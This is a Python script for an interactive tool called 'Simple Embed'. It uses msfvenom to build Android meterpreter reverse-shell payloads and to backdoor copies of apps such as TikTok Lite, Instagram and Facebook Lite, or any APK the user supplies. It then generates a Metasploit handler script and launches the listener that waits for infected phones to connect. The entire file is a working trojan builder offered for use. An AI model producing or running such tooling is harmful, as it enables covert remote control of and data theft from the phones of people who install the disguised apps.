#!/bin/python3

import time
import sys
import os
import requests
from time import sleep
from sys import platform
from os import system

# colors
w = "\033[00m"
r = "\033[31m"
g = "\033[32m"
y = "\033[33m"
b = "\033[34m"

payload = "android/meterpreter/reverse_tcp"

def banner():
    os.system("clear")
    print(f"""{g}
                  .           .
                  M.          .M
                   MMMMMMMMMMM.
                .MMM\MMMMMMM/MMM.
               .MMM.7MMMMMMM.7MMM.
              .MMMMMMMMMMMMMMMMMMM
              MMMMMMM.......MMMMMMM
              MMMMMMMMMMMMMMMMMMMMM
         MMMM MMMMMMMMMMMMMMMMMMMMM MMMM
        dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD
        dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD
        dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD
        dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD
        dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD
         MMM8 MMMMMMMMMMMMMMMMMMMMM 8MMM
              MMMMMMMMMMMMMMMMMMMMM
              MMMMMMMMMMMMMMMMMMMMM
                  MMMMM   MMMMM
                  MMMMM   MMMMM       \033[2;37mSIMPLE EMBED\033[00m\033[33m V1.0\033[32m
                  MMMMM   MMMMM       \033[2;37mAUTHOR BY\033[00m\033[1;31m @NEXUS-ID7\033[00m\033[32m
                  MMMMM   MMMMM
                  .MMM.   .MMM.

{w}╔──────────────────────────────────────────────────────────╗
{w}| [ {r}Author  {w}]{w} NEXUS-ID7                                    |
{w}| [ {r}GitHub  {w}]{w} https://github.com/nexus-id7                 |
{w}| [ {r}YouTube {w}]{w} https://www.youtube.com/@nexus-id7           |
{w}┖──────────────────────────────────────────────────────────┙
""")

def list():
    try:
        print("")
        print(f"{g}[1] {w}Tiktok_lite.apk")
        print(f"{g}[2] {w}Droid_sqli.apk")
        print(f"{g}[3] {w}UC_Mini.apk")
        print(f"{g}[4] {w}Instagram.apk")
        print(f"{g}[5] {w}Facebook_lite.apk")
        print(f"{g}[0] {w}Back")
        print("")
        nex = input(f"{g}[>] {w}Select: {g}")
        if nex == '1':
           tmp = 'apk/tiktok_lite.apk'
           pass
        elif nex == '2':
           tmp = 'apk/droid_sqli.apk'
           pass
        elif nex == '3':
           tmp = 'apk/uc_mini.apk'
           pass
        elif nex == '4':
           tmp = 'apk/instagram.apk'
           pass
        elif nex == '5':
           tmp = 'apk/fblite.apk'
           pass
        elif nex == '0':
            menu()
        else: exit(1)

        addrs = input(f"\n{w}Do you want use 127.0.0.1? (y/n): ")
        print()
        if addrs == 'y' or addrs == 'Y':
           host = '127.0.0.1'
           print(f'{b}[>] {w}set LHOST: {g}'+host)
           pass
        else:
             host = str(input(f"{b}[>] {w}set LHOST: {g}"))
             if host == '' or host == '':
                host = '127.0.0.1'
                print(f'{y}[*] {w}Use lhost default: {g}'+host)
                pass
             else:
                  host = host
                  pass

        port = str(input(f"{b}[>] {w}set LPORT: {g}"))
        if port == '' or port == '':
           port = '9090'
           print(f"{y}[*] {w}Use lport default: {g}"+port)
           pass
        else:
             port = port
             pass

        outt = str(input(f"{b}[>] {w}set OUTPUT ({r}ex: /root/payload.apk{w}): {g}"))
        print(f"{r}[!] {w}processing generate payloads using msfvenom")
        sleep(9)
        print(f"{r}[!] {w}processing embed {g}"+str(tmp)+" \033[00musing msfvenom")
        os.system("msfvenom -x "+str(tmp)+" -p "+payload+" LHOST="+str(host)+" LPORT="+str(port)+" -o "+outt+" > /dev/null 2>&1")
        if os.path.isfile(outt):
           print(f"{r}[!] {w}generate file handler.rc")
           os.system(f"echo 'use multi/handler\nset payload {payload}\nset lhost {host}\nset lport {port}\nshow options\nrun' >> handler.rc")
           sleep(2)
           print(f"{g}[-] {w}sucessfully generate file handler.rc")
           print(f"{g}[-] {w}sucessfully embed {g}"+str(tmp)+" \033[00mfile saved it: \033[32m"+str(outt))
           msf_run()
        else:
           exit(f"{r}[!] {w}embed {g}"+str(tmp)+" \033[00mfailed!")

    except KeyboardInterrupt: exit()


def old():
    try:
        apkori = str(input(f"\n{b}[>] {w}set APK ORIGINAL: {g}"))
        if apkori == '' or apkori == '':
           print(f"{r}[!] {w}apk original not found")
           exit()
        else:
             apkori = apkori
             pass

        addrs = input(f"\n{w}Do you want use 127.0.0.1? (y/n): ")
        if addrs == 'y' or addrs == 'Y':
           host = '127.0.0.1'
           print(f"{b}[>] {w}set LHOST: {g}"+host)
           pass
        else:
              host = str(input(f"{b}[>] {w}set LHOST: {g}"))
              if host == '' or host == '':
                 host = '127.0.0.1'
                 print(f"{y}[*] {w}Use lhost default: {g}"+host)
                 pass
              else:
                   host = host
                   pass

        port = str(input(f"{b}[>] {w}set LPORT: {g}"))
        if port == '' or port == '':
           port = '9090'
           print(f"{y}[*] {w}Use lport default: {g}"+port)
           pass
        else:
             port = port
             pass

        outt = str(input(f"{b}[>] {w}set OUTPUT ({r}ex: /root/embed.apk{w}): {g}"))
        print(f"{r}[!] {w}processing generate payloads using msfvenom")
        sleep(9)
        print(f"{r}[!] {w}processing embed {g}"+str(apkori)+" \033[00musing msfvenom")
        os.system("msfvenom -x "+str(apkori)+" -p "+payload+" LHOST="+str(host)+" LPORT="+str(port)+" -o "+str(outt)+" > /dev/null 2>&1")
        print(f"{r}[!] {w}generate file handler.rc")
        os.system(f"echo 'use multi/handler\nset payload {payload}\nset lhost {host}\nset lport {port}\nshow options\nrun' >> handler.rc")
        sleep(2)
        if os.path.isfile(outt):
            print(f"{g}[-] {w}sucessfully generate file handler.rc")
            print(f"{g}[-] {w}sucessfully embed {g}"+str(apkori)+" \033[00mto backdor {g}"+str(outt))
            print(f"{g}[-] {w}file saved it: {g}"+str(outt))
            msf_run()
        else:
             print(f"{r}[!] {w}embed {g}"+str(apkori)+" \033[00mfailed")
             exit()
    except KeyboardInterrupt: exit()

def msf_run():
    try:
        nex = input("\n\033[00mDo you want starting listener? (y/n): \033[00m")
        if nex == 'y' or nex == 'Y':
           os.system('msfconsole -q -r handler.rc')
           os.system('rm -rf handler.rc')
        else:
             input("\nPress ENTER key for back menu....")
             os.system("rm -rf handler.rc")
    except KeyboardInterrupt: exit()

def apk_backdor():
    try:
        print("")
        print(f"{g}[1] {w}android/meterpreter/reverse_tcp")
        print(f"{g}[2] {w}android/meterpreter/reverse_https")
        print(f"{g}[3] {w}android/meterpreter/reverse_http")
        print(f"{g}[0] {w}back")
        print("")
        nex = input(f"{g}[>] {w}Select: {g}")
        if nex == '1':
           tmp = 'tcp'
           pass
        elif nex == '2':
           tmp = 'https'
           pass
        elif nex == '3':
           tmp = 'http'
           pass
        elif nex == '0': menu()
        else: exit(1)
        addrs = input(f"\n{w}Do you want use 127.0.0.1? (y/n): ")
        print()
        if addrs == 'Y' or addrs == 'y':
           host = '127.0.0.1'
           print(f"{b}[>] {w}set LHOST: {g}"+host)
           pass
        else:
             host = str(input(f"{b}[>] {w}set LHOST: {g}"))
             if host == '' or host == '':
                host = '127.0.0.1'
                print(f"{y}[*] {w}Use lhost default: {g}"+host)
                pass
             else:
                   host = host
                   pass

        port = str(input(f"{b}[>] {w}set LPORT: {g}"))
        if port == '' or port == '':
           port = '9090'
           print(f"{y}[*] {w}Use lport default: {g}"+port)
           pass
        else:
             port = port
             pass

        outt = str(input(f"{b}[>] {w}set OUTPUT ({r}ex: /root/backdor.apk{w}): {g}"))
        print(f"{r}[!] {w}processing generate payloads using msfvenom")
        os.system("msfvenom -p android/meterpreter/reverse_"+str(tmp)+" LHOST="+str(host)+" LPORT="+str(port)+" -o "+str(outt)+" > /dev/null 2>&1")
        print(f"{r}[!] {w}generate file handler.rc")
        sleep(2)
        os.system(f"echo 'use multi/handler\nset payload android/meterpreter/reverse_{tmp}\nset lhost {host}\nset lport {port}\nshow options\nrun' >> handler.rc")
        if os.path.isfile(outt):
           print(f"{g}[-] {w}sucessfully generate file")
           print(f"{g}[-] {w}sucessfully generate payloads file saved it: {g}"+str(outt))
           msf_run()
        else:
             print(f"{r}[!] {w}generate payloads failed")
             exit()
    except KeyboardInterrupt: exit()

def menu():
    banner()
    print(f"{g}[1] {w}Apk msf")
    print(f"{g}[2] {w}Backdoor apk original ({g}old{w})")
    print(f"{g}[3] {w}Backdoor apk original ({g}list{w})")
    print(f"{g}[0] {w}Quit\n")
    nex = input(f"{g}[>] {w}Select: {g}")
    if nex == '1': apk_backdor()
    elif nex == '2': old()
    elif nex == '3': list()
    elif nex == '0': exit()
    else: exit()
try:
   menu()
except KeyboardInterrupt: exit(f"{r}* Abouting")
